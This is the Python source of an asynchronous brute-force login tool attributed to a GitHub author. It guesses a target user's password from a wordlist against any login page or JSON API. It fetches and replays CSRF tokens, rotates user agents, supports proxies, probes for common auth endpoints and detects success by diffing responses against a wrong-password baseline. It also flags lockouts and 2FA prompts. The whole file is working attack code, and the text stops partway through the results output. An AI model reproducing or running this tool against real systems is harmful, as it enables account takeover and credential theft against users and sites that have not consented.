"""
Universal Brute Force with CSRF Bypass — async rewrite
Author: Tanvir Hossain Antu  (https://github.com/Antu7)

Architecture
    asyncio + aiohttp for I/O-bound concurrency
    Baseline-diff success detection (no string-match guesswork)
    Cached CSRF token, refresh on rotation
    Per-target payload templates (no hardcoded site logic)
    Retry-with-backoff on transient errors
    429 / Retry-After back-pressure for the whole worker pool
    Lockout + 2FA detection
    Resumable state, --output, proxy, custom UA, configurable verify
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import json
import random
import re
import signal
import ssl
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

import aiohttp
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from bs4 import BeautifulSoup
from tqdm.asyncio import tqdm as tqdm_asyncio
from tqdm import tqdm


# ─── ANSI ─────────────────────────────────────────────────────────────────────

class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; WHITE = "\033[97m"

def info(m: str)    -> None: print(f"  {C.BLUE}[*]{C.RESET} {m}")
def ok(m: str)      -> None: print(f"  {C.GREEN}[+]{C.RESET} {m}")
def warn(m: str)    -> None: print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def err(m: str)     -> None: print(f"  {C.RED}[x]{C.RESET} {m}")
def dim(m: str)     -> None: print(f"  {C.DIM}    {m}{C.RESET}")
def section(t: str) -> None:
    print(f"\n  {C.CYAN}{'─'*60}{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}{t}{C.RESET}")
    print(f"  {C.CYAN}{'─'*60}{C.RESET}")

BANNER = f"""{C.CYAN}
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████
{C.RESET}{C.DIM}                          Tanvir Hossain Antu
                  https://github.com/Antu7/python-bruteForce{C.RESET}
"""


# ─── Pre-compiled regex (item 25) ─────────────────────────────────────────────

CSRF_RE = re.compile(
    r"csrf[-_]?token|_csrf|csrfmiddlewaretoken|_token|"
    r"authenticity_token|__RequestVerificationToken|XSRF[-_]TOKEN",
    re.IGNORECASE,
)
PASSWORD_INPUT_RE = re.compile(r'<input[^>]+type=["\']password["\']', re.IGNORECASE)
JS_TOKEN_RES = [
    re.compile(r'(?:var|let|const)\s+csrf[_\-]?[tT]oken\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
    re.compile(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
]
TWO_FA_RE = re.compile(
    r"\b(otp|2fa|two[\- ]?factor|mfa|totp|verification[\- ]?code|"
    r"authenticator|step[\- ]?up|sms[\- ]?code)\b",
    re.IGNORECASE,
)
LOCKOUT_RE = re.compile(
    r"\b(too many (failed|attempts)|account (locked|suspended|disabled)|"
    r"temporarily (blocked|locked)|rate[\- ]?limit|try again (later|in))\b",
    re.IGNORECASE,
)
JS_ENDPOINT_RE = re.compile(
    r'''["'](/(?:api|auth|zsvc|v\d)[^"'\s,)}{]*'''
    r'''(?:login|signin|authenticate|session|token)[^"'\s,)}{]*)["']''',
    re.IGNORECASE,
)

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


# ─── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class Config:
    url: str
    username: str
    error_message: str
    password_file: str
    username_field: str = "email"
    password_field: str = "password"
    login_mode: str = "form"           # "form" | "json"
    api_endpoint: str | None = None
    payload_template: dict | None = None  # overrides default {user_field: u, pass_field: p}
    workers: int = 10
    delay: float = 0.0
    jitter: float = 0.0
    timeout: float = 15.0
    max_retries: int = 3
    proxy: str | None = None
    verify_tls: bool = True
    user_agents: list[str] = field(default_factory=lambda: DEFAULT_USER_AGENTS)
    output: str | None = None
    state_file: str | None = None
    probe_endpoints: bool = False
    csrf_token_name: str | None = None  # known token field name (override)


@dataclass
class Baseline:
    """Fingerprint of a wrong-password response. Used to diff future attempts."""
    status: int
    body_len: int
    body_hash: str
    final_url: str
    redirected: bool
    set_cookie_keys: tuple[str, ...]

    @classmethod
    def from_response(cls, status: int, body: str, final_url: str,
                      initial_url: str, set_cookie_keys: tuple[str, ...]) -> "Baseline":
        return cls(
            status=status,
            body_len=len(body),
            body_hash=hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest(),
            final_url=final_url.split("?")[0].rstrip("/"),
            redirected=initial_url.split("?")[0].rstrip("/") != final_url.split("?")[0].rstrip("/"),
            set_cookie_keys=set_cookie_keys,
        )


@dataclass
class AttemptResult:
    success: bool
    password: str
    reason: str | None = None
    needs_2fa: bool = False
    rate_limited: bool = False
    locked_out: bool = False


# ─── CSRF cache (items 1, 7, 24) ──────────────────────────────────────────────

class CSRFCache:
    """One token shared across workers; refreshed on rotation/expiry."""

    def __init__(self, login_url: str, session: ClientSession,
                 headers: dict[str, str], known_name: str | None = None):
        self.login_url = login_url
        self.session = session
        self.headers = headers
        self.known_name = known_name
        self.name: str | None = None
        self.value: str | None = None
        self._lock = asyncio.Lock()
        self._fetched_once = False

    async def get(self, force: bool = False) -> tuple[str | None, str | None]:
        async with self._lock:
            if force or not self._fetched_once or self.value is None:
                await self._fetch()
            return self.name, self.value

    async def invalidate(self) -> None:
        """Mark current token stale so next get() refetches."""
        async with self._lock:
            self.value = None

    async def _fetch(self) -> None:
        try:
            async with self.session.get(self.login_url, headers=self.headers,
                                        allow_redirects=True) as r:
                html = await r.text()
        except Exception:
            self._fetched_once = True
            return

        soup = BeautifulSoup(html, "html.parser")

        # 1) form inputs (single pass — covers hidden + visible)
        for tag in soup.find_all("input"):
            name = tag.get("name", "") or ""
            if CSRF_RE.search(name):
                value = tag.get("value", "") or ""
                if value:
                    self.name, self.value = name, value
                    self._fetched_once = True
                    return

        # 2) meta tags
        for meta in soup.find_all("meta"):
            name = meta.get("name", "") or ""
            if CSRF_RE.search(name):
                content = meta.get("content", "") or ""
                if content:
                    self.name, self.value = name, content
                    self._fetched_once = True
                    return

        # 3) cookies
        for cookie in self.session.cookie_jar:
            if CSRF_RE.search(cookie.key):
                self.name, self.value = cookie.key, cookie.value
                self._fetched_once = True
                return

        # 4) JS variables
        for pat in JS_TOKEN_RES:
            m = pat.search(html)
            if m:
                self.name, self.value = self.known_name or "csrf_token", m.group(1)
                self._fetched_once = True
                return

        self._fetched_once = True


# ─── Cracker ──────────────────────────────────────────────────────────────────

class Cracker:
    """Single instance, async-driven. Owns session, CSRF cache, baseline."""

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.session: ClientSession | None = None
        self.csrf: CSRFCache | None = None
        self.baseline: Baseline | None = None
        self.cancel = asyncio.Event()
        self.pause = asyncio.Event()
        self.pause.set()  # set = not paused
        self._consecutive_lockout_hits = 0
        self._lockout_threshold = 3
        self._stop_reason: str | None = None

    # ── lifecycle ─────────────────────────────────────────────

    async def __aenter__(self) -> "Cracker":
        ssl_ctx: bool | ssl.SSLContext = True
        if not self.cfg.verify_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        connector = TCPConnector(
            limit=self.cfg.workers * 2,
            limit_per_host=self.cfg.workers,
            ssl=ssl_ctx if isinstance(ssl_ctx, ssl.SSLContext) else None,
            ttl_dns_cache=300,
        )
        timeout = ClientTimeout(total=self.cfg.timeout)
        self.session = ClientSession(
            connector=connector,
            timeout=timeout,
            trust_env=True,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            },
        )
        self.csrf = CSRFCache(
            login_url=self.cfg.url,
            session=self.session,
            headers=self._base_headers(),
            known_name=self.cfg.csrf_token_name,
        )
        return self

    async def __aexit__(self, *exc_info) -> None:
        if self.session:
            await self.session.close()

    # ── helpers ───────────────────────────────────────────────

    def _base_headers(self) -> dict[str, str]:
        return {
            "User-Agent": random.choice(self.cfg.user_agents),
            "Referer": self.cfg.url,
            "Origin": f"{urlparse(self.cfg.url).scheme}://{urlparse(self.cfg.url).netloc}",
        }

    def _build_payload(self, password: str) -> dict[str, Any]:
        if self.cfg.payload_template:
            # templated: stringify, replace, re-parse
            raw = json.dumps(self.cfg.payload_template)
            raw = raw.replace("{username}", json.dumps(self.cfg.username)[1:-1]) \
                     .replace("{password}", json.dumps(password)[1:-1])
            return json.loads(raw)
        return {
            self.cfg.username_field: self.cfg.username,
            self.cfg.password_field: password,
        }

    # ── HTTP attempt with retry (items 12, 13) ────────────────

    async def _post(self, password: str) -> tuple[int, str, str, tuple[str, ...]] | None:
        """One attempt. Returns (status, body, final_url, set-cookie keys) or None."""
        assert self.session and self.csrf

        token_name, token_value = await self.csrf.get()
        headers = self._base_headers()
        is_json = self.cfg.login_mode == "json"
        endpoint = self.cfg.api_endpoint if is_json else self.cfg.url

        if is_json:
            headers["Content-Type"] = "application/json"
            headers["Accept"] = "application/json"
            if token_value:
                headers["X-CSRFToken"] = token_value
                headers["X-XSRF-TOKEN"] = token_value
            payload = self._build_payload(password)
            kw: dict[str, Any] = {"json": payload, "headers": headers}
        else:
            payload = self._build_payload(password)
            if token_name and token_value:
                payload[token_name] = token_value
            kw = {"data": payload, "headers": headers}

        if self.cfg.proxy:
            kw["proxy"] = self.cfg.proxy

        backoff = 1.0
        for attempt in range(self.cfg.max_retries):
            await self.pause.wait()
            if self.cancel.is_set():
                return None
            try:
                async with self.session.post(endpoint, allow_redirects=True, **kw) as r:
                    body = await r.text()
                    # 429 → engage pause for whole pool
                    if r.status == 429:
                        retry_after = float(r.headers.get("Retry-After", "5") or 5)
                        await self._engage_pause(retry_after,
                                                 f"server returned 429, sleeping {retry_after:.1f}s")
                        continue  # retry after wake
                    # 419/440: CSRF expired → invalidate and retry
                    if r.status in (419, 440):
                        await self.csrf.invalidate()
                        await asyncio.sleep(backoff)
                        backoff *= 2
                        continue
                    # 5xx → transient
                    if r.status >= 500:
                        await asyncio.sleep(backoff + random.random() * 0.5)
                        backoff *= 2
                        continue
                    set_cookies = tuple(sorted({c.key for c in self.session.cookie_jar}))
                    return r.status, body, str(r.url), set_cookies
            except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
                    asyncio.TimeoutError, aiohttp.ClientOSError):
                await asyncio.sleep(backoff + random.random() * 0.5)
                backoff *= 2
                continue
            except Exception:
                return None
        return None

    async def _engage_pause(self, seconds: float, reason: str) -> None:
        # Only the first task to hit 429 pauses; others wait on the event.
        if self.pause.is_set():
            self.pause.clear()
            try:
                tqdm.write(f"  {C.YELLOW}[!]{C.RESET} {reason}")
                await asyncio.sleep(seconds)
            finally:
                self.pause.set()

    # ── success detection (items 4, 5, 8, 15, 16) ─────────────

    def _check(self, status: int, body: str, final_url: str,
               cookie_keys: tuple[str, ...]) -> tuple[bool, str | None, bool, bool]:
        """
        Returns (is_success, reason, needs_2fa, locked_out).

        Strategy: compare against baseline (a known wrong-password response).
        A response is a candidate hit only if it materially differs.
        """
        b = self.baseline
        assert b is not None

        body_lower = body.lower()

        # Lockout — must be checked first so a "locked" status doesn't look like success.
        if LOCKOUT_RE.search(body_lower):
            return False, None, False, True

        # Explicit error string from baseline still present → fail.
        if self.cfg.error_message and self.cfg.error_message.lower() in body_lower:
            return False, None, False, False

        # JSON path with explicit token-bearing keys.
        success_json = False
        json_reason: str | None = None
        if "application/json" in body_lower[:200] or body.lstrip().startswith(("{", "[")):
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    for key in ("token", "access_token", "jwt", "id_token"):
                        v = data.get(key)
                        if isinstance(v, str) and len(v) > 10:
                            success_json = True
                            json_reason = f"response carried '{key}' ({len(v)} chars)"
                            break
                    if not success_json:
                        for key in ("error", "message", "msg", "detail", "errors", "code"):
                            ev = str(data.get(key, "")).lower()
                            if ev and any(x in ev for x in
                                          ("invalid", "incorrect", "wrong", "failed",
                                           "unauthorized", "denied", "bad credentials")):
                                return False, None, False, False
            except (json.JSONDecodeError, ValueError):
                pass

        # Diff against baseline.
        body_h = hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest()
        size_delta = abs(len(body) - b.body_len)
        size_ratio = size_delta / max(b.body_len, 1)

        diffs: list[str] = []
        if status != b.status:
            diffs.append(f"status {b.status}→{status}")
        new_final = final_url.split("?")[0].rstrip("/")
        if new_final != b.final_url:
            diffs.append(f"final URL changed ({new_final})")
        if body_h != b.body_hash and size_ratio > 0.05:
            diffs.append(f"body diverged (Δ{size_delta} bytes, {size_ratio*100:.1f}%)")
        new_cookies = set(cookie_keys) - set(b.set_cookie_keys)
        if new_cookies:
            diffs.append(f"new cookies: {','.join(sorted(new_cookies))}")

        if not diffs and not success_json:
            return False, None, False, False

        # 2FA detection — credential is correct but step-up is required.
        if TWO_FA_RE.search(body_lower):
            return True, "2FA challenge issued", True, False

        # Still has password input + similar URL → likely re-render with new error → fail.
        if not success_json and PASSWORD_INPUT_RE.search(body) and new_final == b.final_url:
            return False, None, False, False

        if success_json:
            return True, json_reason, False, False
        return True, "; ".join(diffs), False, False

    # ── public attempt ────────────────────────────────────────

    async def attempt(self, password: str) -> AttemptResult:
        # Polite delay
        if self.cfg.delay or self.cfg.jitter:
            await asyncio.sleep(self.cfg.delay + random.random() * self.cfg.jitter)

        result = await self._post(password)
        if result is None:
            return AttemptResult(success=False, password=password)
        status, body, final_url, cookie_keys = result
        success, reason, needs_2fa, locked = self._check(status, body, final_url, cookie_keys)

        if locked:
            self._consecutive_lockout_hits += 1
            if self._consecutive_lockout_hits >= self._lockout_threshold:
                self._stop_reason = "lockout detected (multiple responses)"
                self.cancel.set()
            return AttemptResult(success=False, password=password, locked_out=True)
        else:
            self._consecutive_lockout_hits = 0

        return AttemptResult(success=success, password=password, reason=reason,
                             needs_2fa=needs_2fa)

    # ── baseline / preflight (item 4 backbone) ────────────────

    async def calibrate(self) -> bool:
        """Run two random-password attempts, derive baseline. Verify stability."""
        info("Calibrating with random passwords (no real attempts yet)...")
        token1 = hashlib.sha256(str(random.random()).encode()).hexdigest()[:24]
        token2 = hashlib.sha256(str(random.random()).encode()).hexdigest()[:24]

        # Force initial CSRF fetch.
        await self.csrf.get(force=True)

        r1 = await self._post(token1)
        if r1 is None:
            err("Could not reach target during calibration.")
            return False
        s1, b1, u1, c1 = r1
        self.baseline = Baseline.from_response(
            s1, b1, u1, self.cfg.url, c1
        )

        r2 = await self._post(token2)
        if r2 is None:
            warn("Second calibration request failed; using single-shot baseline.")
            return True
        s2, b2, u2, c2 = r2

        # Stability check: both wrong passwords should look similar.
        size_delta_ratio = abs(len(b2) - len(b1)) / max(len(b1), 1)
        if s1 != s2 or size_delta_ratio > 0.10:
            warn(f"Baseline unstable (status {s1} vs {s2}, body Δ {size_delta_ratio*100:.1f}%).")
            warn("Detection may be noisy — consider tightening the error message.")
        else:
            ok(f"Baseline locked: status={s1}, body={len(b1)}B, hash={self.baseline.body_hash[:12]}…")

        # Did our random password trigger a "success"? If so, configuration is wrong.
        success, reason, _, _ = self._check(s2, b2, u2, c2)
        if success:
            err("Random password reported as success — configuration is wrong.")
            dim(f"reason: {reason}")
            return False
        return True


# ─── Auto-detection (refactored, async) ───────────────────────────────────────

async def analyze(url: str, session: ClientSession, probe: bool) -> dict:
    section("AUTO-DETECTING TARGET")
    info("Fetching login page...")

    result = {
        "login_mode": "form",
        "api_endpoint": url,
        "username_field": "email",
        "password_field": "password",
        "csrf_token": None,
    }

    headers = {"User-Agent": random.choice(DEFAULT_USER_AGENTS)}
    try:
        async with session.get(url, headers=headers, allow_redirects=True) as r:
            html = await r.text()
    except Exception as e:
        err(f"Could not fetch login page: {e}")
        return result

    soup = BeautifulSoup(html, "html.parser")
    scripts = soup.find_all("script")

    # 1) login type
    info("Detecting login type...")
    js_indicators = ["fetch(", "axios", "xmlhttprequest", "handlelogin", "submitlogin",
                     "/api/", "/auth/", "application/json", "react", "vue", "angular",
                     "next", "nuxt"]
    is_json_api = any(
        any(ind in (s.get("src", "") or "").lower() or ind in s.get_text().lower()
            for ind in js_indicators)
        for s in scripts
    )
    pw_inputs = soup.find_all("input", type="password")
    forms_with_pw = sum(1 for f in soup.find_all("form") if f.find("input", type="password"))
    if pw_inputs and forms_with_pw == 0:
        is_json_api = True
    if not soup.find_all("form") and not pw_inputs:
        is_json_api = True

    result["login_mode"] = "json" if is_json_api else "form"
    ok(f"Login type: {result['login_mode'].upper()}")

    # 2) field names
    info("Detecting field names...")
    skip = ["reset", "forgot", "recover", "signup", "register", "search",
            "subscribe", "newsletter"]
    user_pats = ["user", "email", "login", "account", "name"]
    contexts = [f for f in soup.find_all("form") if f.find("input", type="password")] or [soup]
    found_user = found_pass = False
    for ctx in contexts:
        for inp in ctx.find_all("input"):
            n = (inp.get("name", "") or "").lower()
            i = (inp.get("id", "") or "").lower()
            t = (inp.get("type", "") or "").lower()
            if any(s in n or s in i for s in skip):
                continue
            if not found_user and t in ("text", "email", ""):
                if any(p in n or p in i for p in user_pats):
                    result["username_field"] = inp.get("name") or inp.get("id") or "email"
                    found_user = True
            if not found_pass and t == "password":
                fn = inp.get("name") or inp.get("id")
                if fn:
                    result["password_field"] = fn
                    found_pass = True
    ok(f"Username field: {C.BOLD}{result['username_field']}{C.RESET}")
    ok(f"Password field: {C.BOLD}{result['password_field']}{C.RESET}")

    # 3) API endpoint
    if result["login_mode"] == "json":
        info("Discovering API endpoint...")
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        js_endpoints: set[str] = set()
        for s in scripts:
            for m in JS_ENDPOINT_RE.findall(s.get_text()):
                js_endpoints.add(m)

        if js_endpoints:
            # Pick the most-likely auth endpoint.
            ranked = sorted(js_endpoints,
                            key=lambda e: ("login" in e, "auth" in e, len(e)),
                            reverse=True)
            chosen = ranked[0]
            result["api_endpoint"] = urljoin(base, chosen)
            ok(f"API endpoint (from JS): {C.BOLD}{result['api_endpoint']}{C.RESET}")
        elif probe:
            warn("No endpoint in JS — probing common paths (noisy, may trip WAFs).")
            common = ["/api/login", "/api/auth/login", "/api/v1/login",
                     "/api/v1/auth/login", "/auth/login", "/api/users/login",
                     "/api/sessions", "/login"]
            for path in common:
                test_url = base + path
                try:
                    async with session.post(test_url, json={"x": "y"},
                                            headers={**headers, "Content-Type": "application/json"},
                                            allow_redirects=False) as t:
                        if t.status in (200, 400, 401, 403, 422):
                            result["api_endpoint"] = test_url
                            ok(f"Probed endpoint: {test_url}")
                            break
                except Exception:
                    pass
            else:
                result["api_endpoint"] = base + "/api/login"
                warn(f"Falling back to default: {result['api_endpoint']}")
        else:
            result["api_endpoint"] = base + "/api/login"
            dim("Endpoint probing disabled (--probe-endpoints to enable).")
            dim(f"Default: {result['api_endpoint']} — override with --api-endpoint.")

    # 4) CSRF
    info("Checking for CSRF protection...")
    for inp in soup.find_all("input"):
        n = inp.get("name", "") or ""
        if CSRF_RE.search(n):
            result["csrf_token"] = n
            break
    if not result["csrf_token"]:
        for cookie in session.cookie_jar:
            if CSRF_RE.search(cookie.key):
                result["csrf_token"] = cookie.key
                break
    if result["csrf_token"]:
        ok(f"CSRF token field: {result['csrf_token']}")
    else:
        dim("No CSRF protection detected.")
    return result


# ─── State persistence (item 18) ──────────────────────────────────────────────

def state_signature(cfg: Config) -> str:
    sig = f"{cfg.url}|{cfg.username}|{cfg.username_field}|{cfg.password_field}|{cfg.login_mode}|{cfg.api_endpoint}"
    return hashlib.sha1(sig.encode()).hexdigest()[:16]

def load_state(path: str | None, sig: str) -> set[str]:
    if not path:
        return set()
    p = Path(path)
    if not p.exists():
        return set()
    try:
        data = json.loads(p.read_text())
    except json.JSONDecodeError:
        return set()
    if data.get("sig") != sig:
        warn(f"State file {path} is for a different target — ignoring.")
        return set()
    return set(data.get("tried", []))

def save_state(path: str | None, sig: str, tried: set[str], found: dict | None) -> None:
    if not path:
        return
    Path(path).write_text(json.dumps({
        "sig": sig,
        "tried": sorted(tried),
        "found": found,
        "saved_at": time.time(),
    }))


# ─── Orchestrator ─────────────────────────────────────────────────────────────

async def run_attack(cfg: Config) -> AttemptResult | None:
    sig = state_signature(cfg)
    already_tried = load_state(cfg.state_file, sig)

    pwd_path = Path(cfg.password_file)
    if not pwd_path.exists():
        err(f"Password file not found: {cfg.password_file}")
        return None
    raw_passwords = [p.strip() for p in pwd_path.read_text(encoding="utf-8",
                                                           errors="ignore").splitlines()
                     if p.strip()]
    passwords = [p for p in raw_passwords if p not in already_tried]
    if already_tried:
        info(f"Resuming: skipping {len(already_tried)} previously tried passwords.")
    if not passwords:
        warn("No passwords left to try.")
        return None

    async with Cracker(cfg) as cracker:
        section("PRE-FLIGHT CALIBRATION")
        if not await cracker.calibrate():
            err("Calibration failed. Aborting before sending real passwords.")
            return None

        section("ATTACK IN PROGRESS")
        info(f"{len(passwords)} passwords | {cfg.workers} workers"
             + (f" | proxy={cfg.proxy}" if cfg.proxy else "")
             + (f" | delay={cfg.delay}s ±{cfg.jitter}s" if cfg.delay or cfg.jitter else ""))

        sem = asyncio.Semaphore(cfg.workers)
        progress = tqdm(total=len(passwords), unit="pwd", dynamic_ncols=True,
                        bar_format="  {desc}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
        tried_in_run: set[str] = set()
        result_holder: dict[str, AttemptResult] = {}
        flush_every = 50
        flushed = [0]

        # signal handling
        loop = asyncio.get_running_loop()
        def request_stop():
            if not cracker.cancel.is_set():
                tqdm.write(f"  {C.YELLOW}[!]{C.RESET} Stop requested.")
                cracker.cancel.set()
        for sig_ in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig_, request_stop)
            except NotImplementedError:
                pass  # Windows

        async def worker(pwd: str) -> None:
            if cracker.cancel.is_set() or "found" in result_holder:
                return
            async with sem:
                if cracker.cancel.is_set() or "found" in result_holder:
                    return
                res = await cracker.attempt(pwd)
                tried_in_run.add(pwd)
                progress.update(1)
                progress.set_description_str(f"  {pwd[:18]:<18} ")
                if res.success:
                    result_holder["found"] = res
                    cracker.cancel.set()
                # Periodic state flush.
                if cfg.state_file and len(tried_in_run) - flushed[0] >= flush_every:
                    flushed[0] = len(tried_in_run)
                    save_state(cfg.state_file, sig,
                               already_tried | tried_in_run,
                               asdict(res) if res.success else None)

        tasks = [asyncio.create_task(worker(p)) for p in passwords]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            progress.close()
            save_state(cfg.state_file, sig, already_tried | tried_in_run,
                       asdict(result_holder["found"]) if "found" in result_holder else None)

        if cracker._stop_reason and "found" not in result_holder:
            warn(f"Attack stopped: {cracker._stop_reason}")

        return result_holder.get("found")


# ─── CLI (item 17) ────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Universal brute-force tool with CSRF bypass (async).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--url", help="Login page URL")
    p.add_argument("--username", help="Target username/email")
    p.add_argument("--error-message", help="String present in wrong-password response (helps detection)")
    p.add_argument("--passwords", help="Path to password wordlist")
    p.add_argument("--username-field", help="Form field name for username (auto-detected if absent)")
    p.add_argument("--password-field", help="Form field name for password (auto-detected if absent)")
    p.add_argument("--mode", choices=["auto", "form", "json"], default="auto")
    p.add_argument("--api-endpoint", help="Override JSON API endpoint")
    p.add_argument("--payload-template",
                   help='JSON payload template, use {username}/{password} placeholders. '
                        'Example: \'{"type":"userpass","username":"{username}","password":"{password}"}\'')
    p.add_argument("--workers", type=int, default=10)
    p.add_argument("--delay", type=float, default=0.0, help="Delay between attempts per worker")
    p.add_argument("--jitter", type=float, default=0.0, help="Random extra delay (0..jitter)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--max-retries", type=int, default=3)
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    p.add_argument("--user-agent", action="append", help="UA string (repeatable; rotates randomly)")
    p.add_argument("--output", help="Write found credential to this file (JSON)")
    p.add_argument("--state-file", help="Resume/persist state to this JSON file")
    p.add_argument("--probe-endpoints", action="store_true",
                   help="Probe common API endpoints during analysis (noisy, may trip WAFs)")
    p.add_argument("--non-interactive", action="store_true",
                   help="Fail instead of prompting for missing values")
    return p.parse_args()


def interactive_prompt(label: str, default: str | None = None, hint: str | None = None) -> str:
    if hint:
        print(f"  {C.DIM}    Hint: {hint}{C.RESET}")
    if default:
        v = input(f"  {C.WHITE}{label} {C.DIM}[{default}]{C.RESET}: ").strip()
        return v or default
    return input(f"  {C.WHITE}{label}{C.RESET}: ").strip()


def collect_config(args: argparse.Namespace) -> Config | None:
    print(BANNER)

    def need(value: str | None, label: str, hint: str | None = None,
             default: str | None = None) -> str | None:
        if value:
            return value
        if args.non_interactive:
            err(f"--{label.lower().replace(' ', '-')} is required in non-interactive mode")
            return None
        return interactive_prompt(label, default=default, hint=hint)

    section("TARGET")
    url = need(args.url, "Target login page URL",
               hint="Full URL of the login page, e.g. https://example.com/login")
    if not url:
        return None
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    username = need(args.username, "Target username / email")
    if not username:
        return None
    error_message = need(args.error_message, "Wrong-password error string",
                         hint="Submit a wrong password manually, copy the exact response error.")
    if not error_message:
        return None
    pwd_file = need(args.passwords, "Password wordlist path", default="passwords.txt")
    if not pwd_file:
        return None

    payload_tpl = None
    if args.payload_template:
        try:
            payload_tpl = json.loads(args.payload_template)
        except json.JSONDecodeError as e:
            err(f"--payload-template is not valid JSON: {e}")
            return None

    cfg = Config(
        url=url,
        username=username,
        error_message=error_message,
        password_file=pwd_file,
        username_field=args.username_field or "email",
        password_field=args.password_field or "password",
        login_mode="form" if args.mode == "form" else ("json" if args.mode == "json" else "form"),
        api_endpoint=args.api_endpoint,
        payload_template=payload_tpl,
        workers=args.workers,
        delay=args.delay,
        jitter=args.jitter,
        timeout=args.timeout,
        max_retries=args.max_retries,
        proxy=args.proxy,
        verify_tls=not args.insecure,
        user_agents=args.user_agent or DEFAULT_USER_AGENTS,
        output=args.output,
        state_file=args.state_file,
        probe_endpoints=args.probe_endpoints,
    )
    return cfg


async def amain() -> int:
    args = parse_args()
    cfg = collect_config(args)
    if cfg is None:
        return 2

    # Auto-detection unless every field was given via CLI.
    needs_analysis = (args.mode == "auto"
                      or not args.username_field
                      or not args.password_field
                      or (not args.api_endpoint and args.mode != "form"))

    if needs_analysis:
        ssl_ctx: bool | ssl.SSLContext = True
        if not cfg.verify_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
        connector = TCPConnector(
            ssl=ssl_ctx if isinstance(ssl_ctx, ssl.SSLContext) else None
        )
        async with ClientSession(connector=connector,
                                 timeout=ClientTimeout(total=cfg.timeout),
                                 trust_env=True) as session:
            detected = await analyze(cfg.url, session, probe=cfg.probe_endpoints)
        if not args.username_field:
            cfg.username_field = detected["username_field"]
        if not args.password_field:
            cfg.password_field = detected["password_field"]
        if args.mode == "auto":
            cfg.login_mode = detected["login_mode"]
        if not args.api_endpoint:
            cfg.api_endpoint = detected["api_endpoint"] if cfg.login_mode == "json" else cfg.url
        cfg.csrf_token_name = detected["csrf_token"]

    if cfg.login_mode == "form" and not cfg.api_endpoint:
        cfg.api_endpoint = cfg.url

    # Summary
    section("CONFIGURATION SUMMARY")
    rows = [
        ("Target URL", cfg.url),
        ("Username", cfg.username),
        ("Login Mode", cfg.login_mode.upper()),
        ("API Endpoint", cfg.api_endpoint),
        ("Username Field", cfg.username_field),
        ("Password Field", cfg.password_field),
        ("CSRF Token", cfg.csrf_token_name or "None"),
        ("Workers", str(cfg.workers)),
        ("Timeout / Retries", f"{cfg.timeout}s / {cfg.max_retries}"),
        ("Delay / Jitter", f"{cfg.delay}s / {cfg.jitter}s"),
        ("Proxy", cfg.proxy or "None"),
        ("TLS Verify", "yes" if cfg.verify_tls else "NO (insecure)"),
        ("Wordlist", cfg.password_file),
        ("State File", cfg.state_file or "None"),
        ("Output File", cfg.output or "None"),
    ]
    print()
    for k, v in rows:
        print(f"  {C.DIM}{k:<20}{C.RESET} {v}")
    print()

    if not args.non_interactive:
        if interactive_prompt("Start attack? (Y/n)", default="Y").lower() not in ("y", "yes", ""):
            warn("Aborted.")
            return 0

    # Run
    t0 = time.monotonic()
    found = await run_attack(cfg)
    elapsed = time.monotonic() - t0

    section("RESULTS")
    print()
    print(f"  {C.DIM}{'Elapsed':<20}{C.RESET} {elapsed:.2f}s")
    if found and found.success:
        print(f"  {C.GREEN}{C.BOLD}PASSWORD FOUND{C.RESET}")
        print(f"  {C.GREEN}{'Username':<20}{C.RESET} {cfg.username}")
        print(f"  {C.GREEN}{'Password':<20}{C.RESET} {found.password}")
        if found.needs_2fa:
